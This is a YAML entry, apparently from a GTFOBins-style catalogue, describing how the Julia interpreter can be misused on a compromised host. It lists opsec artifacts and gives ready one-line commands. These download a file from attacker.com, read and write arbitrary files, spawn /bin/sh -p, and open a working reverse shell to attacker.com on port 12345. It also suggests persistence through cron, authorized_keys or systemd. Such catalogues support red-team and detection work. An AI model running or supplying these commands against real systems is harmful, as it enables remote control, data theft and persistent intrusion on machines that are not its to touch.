---
name: julia
capabilities:
- exec
- spawn
- read
- write
- download
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: julia -e 'run(`/bin/sh -p`)'
references:
- https://gtfobins.github.io/gtfobins/julia/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
